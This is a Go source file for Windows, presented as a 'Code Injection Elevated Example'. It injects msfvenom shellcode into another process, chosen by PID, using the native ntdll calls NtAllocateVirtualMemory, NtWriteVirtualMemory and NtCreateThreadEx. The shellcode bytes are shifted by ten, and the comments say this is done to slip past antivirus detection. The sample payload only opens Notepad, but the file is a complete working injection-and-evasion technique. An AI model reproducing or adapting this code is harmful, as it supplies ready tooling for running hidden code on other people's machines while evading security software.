// +build windows

// Build only for Windows
//
// Copyright (C) 2020 secfurry
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// Code Injection Elevated Example
//   Will attempt to inject code that launches "notepad.exe" from the targeted process.
package main

import (
	"fmt"
	"os"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "%s <pid>", os.Args[0])
		os.Exit(1)
	}

	// OpenProcess request access rights
	const requestRights = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
		windows.PROCESS_DUP_HANDLE | 0x001

	var (

		// Victim process ID
		// Taken from command line.
		targetPID, _ = strconv.Atoi(os.Args[1])

		dllNtdll = windows.NewLazySystemDLL("ntdll.dll")

		funcNtCreateThreadEx        = dllNtdll.NewProc("NtCreateThreadEx")
		funcNtWriteVirtualMemory    = dllNtdll.NewProc("NtWriteVirtualMemory")
		funcNtAllocateVirtualMemory = dllNtdll.NewProc("NtAllocateVirtualMemory")

		// Shellcode
		// msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f c
		// Payload size: 279 bytes
		// Shifted 10 bytes right to prevent AV detection of shellcode.
		shellcodeData = []byte("" +
			"\x06\x52\x8d\xee\xfa\xf2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x5c\x5b\x60\x52\x3b\xdc" +
			"\x6f\x52\x95\x5c\x6a\x52\x95\x5c\x22\x52\x95\x5c\x2a\x52\x95\x7c\x5a\x52\x19\xc1" +
			"\x54\x54\x57\x3b\xd3\x52\x3b\xca\xb6\x46\x6b\x86\x0c\x36\x2a\x4b\xcb\xd3\x17\x4b" +
			"\x0b\xcb\xec\xf7\x5c\x4b\x5b\x52\x95\x5c\x2a\x95\x4c\x46\x52\x0b\xda\x95\x8a\x92" +
			"\x0a\x0a\x0a\x52\x8f\xca\x7e\x71\x52\x0b\xda\x5a\x95\x52\x22\x4e\x95\x4a\x2a\x53" +
			"\x0b\xda\xed\x60\x52\x09\xd3\x4b\x95\x3e\x92\x52\x0b\xe0\x57\x3b\xd3\x52\x3b\xca" +
			"\xb6\x4b\xcb\xd3\x17\x4b\x0b\xcb\x42\xea\x7f\xfb\x56\x0d\x56\x2e\x12\x4f\x43\xdb" +
			"\x7f\xe2\x62\x4e\x95\x4a\x2e\x53\x0b\xda\x70\x4b\x95\x16\x52\x4e\x95\x4a\x26\x53" +
			"\x0b\xda\x4b\x95\x0e\x92\x52\x0b\xda\x4b\x62\x4b\x62\x68\x63\x64\x4b\x62\x4b\x63" +
			"\x4b\x64\x52\x8d\xf6\x2a\x4b\x5c\x09\xea\x62\x4b\x63\x64\x52\x95\x1c\xf3\x61\x09" +
			"\x09\x09\x67\x52\xc4\x0b\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x52\x97\x97\x0b\x0b\x0a\x0a" +
			"\x4b\xc4\x3b\x95\x79\x91\x09\xdf\xc5\xea\x27\x34\x14\x4b\xc4\xb0\x9f\xc7\xa7\x09" +
			"\xdf\x52\x8d\xce\x32\x46\x10\x86\x14\x8a\x05\xea\x7f\x0f\xc5\x51\x1d\x7c\x79\x74" +
			"\x0a\x63\x4b\x93\xe4\x09\xdf\x78\x79\x7e\x6f\x7a\x6b\x6e\x38\x6f\x82\x6f\x0a",
		)
	)

	// De-shift the code by 10.
	// Antivirus detects on the shellcode itself so this will bypass it.
	for i := range shellcodeData {
		shellcodeData[i] -= 10
	}

	// Get HANDLE to the target process
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	//
	targetHandle, err := windows.OpenProcess(
		requestRights,     // Security Access rights
		true,              // Inherit Handles
		uint32(targetPID), // Target Process ID
	)

	if err != nil {
		panic("OpenProcess failed: " + err.Error())
	}

	// Declare some variables to collect the base address and the amount of bytes allocated.
	var (
		baseAddress   uintptr
		allocatedSize = uint32(len(shellcodeData))
	)

	// Allocate the memory in the process space of the target process.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory
	//
	// AllocatedSize cannot be NULL or Zero!
	allocResult, _, err := funcNtAllocateVirtualMemory.Call(
		uintptr(targetHandle),                   // HANDLE to the target process
		uintptr(unsafe.Pointer(&baseAddress)),   // Pointer that receives the allocated base address of the memory
		0,                                       // Number of zeros needed, can ignore this
		uintptr(unsafe.Pointer(&allocatedSize)), // Pointer to a UINT32 to received the total allocated size
		windows.MEM_COMMIT,                      // Memory options
		windows.PAGE_EXECUTE_READWRITE,          // Memory page security options
	)

	if allocResult > 0 {
		panic("NtAllocateVirtualMemory failed: " + err.Error())
	}

	fmt.Printf("Allocated %dbytes at 0x%X\n", allocatedSize, baseAddress)

	// Declare a variabled to receive the amount of bytes that were written.
	var bytesWritten uint32

	// [Undocumented] Write the data from the buffer to the specified memory base address.
	//
	// Doc http://www.codewarrior.cn/ntdoc/winnt/mm/NtWriteVirtualMemory.htm
	//
	writeResult, _, err := funcNtWriteVirtualMemory.Call(
		uintptr(targetHandle),                      // HANDLE to the target process
		uintptr(baseAddress),                       // Memory base address to start at
		uintptr(unsafe.Pointer(&shellcodeData[0])), // Pointer to the data to write
		uintptr(len(shellcodeData)),                // Length of the data to write
		uintptr(unsafe.Pointer(&bytesWritten)),     // Pointer to a UINT32 that receives the amount of bytes written
	)

	if writeResult > 0 {
		panic("NtWriteVirtualMemory failed: " + err.Error())
	}

	fmt.Printf("Wrote %dbytes at 0x%X\n", bytesWritten, baseAddress)

	// Declare a HANDLE to store the resulting thread HANDLE.
	var threadHandle uintptr

	// [Undocumented] Execute the code at the specified memory base address.
	//
	// Doc https://securityxploded.com/ntcreatethreadex.php
	//
	execResult, _, err := funcNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)), // Pointer to receive the HANDLE to the created thread
		windows.GENERIC_ALL,                    // Access rights to create with
		0,                                      // Object attributes, can be NULL
		uintptr(targetHandle),                  // HANDLE to the target process
		baseAddress,                            // Memory base address to execute
		0,                                      // Execution parameters, can be NULL
		0,                                      // Create suspend, set to FALSE
		0,                                      // Stack size count of zeros
		0,                                      // Stack size to commit
		0,                                      // Stack size to reserve
		0,                                      // Output buffer, can be NULL
	)

	if execResult > 0 {
		panic("NtCreateThreadEx failed: " + err.Error())
	}

	fmt.Printf("Execute 0x%X code at 0x%X\n", threadHandle, baseAddress)
}
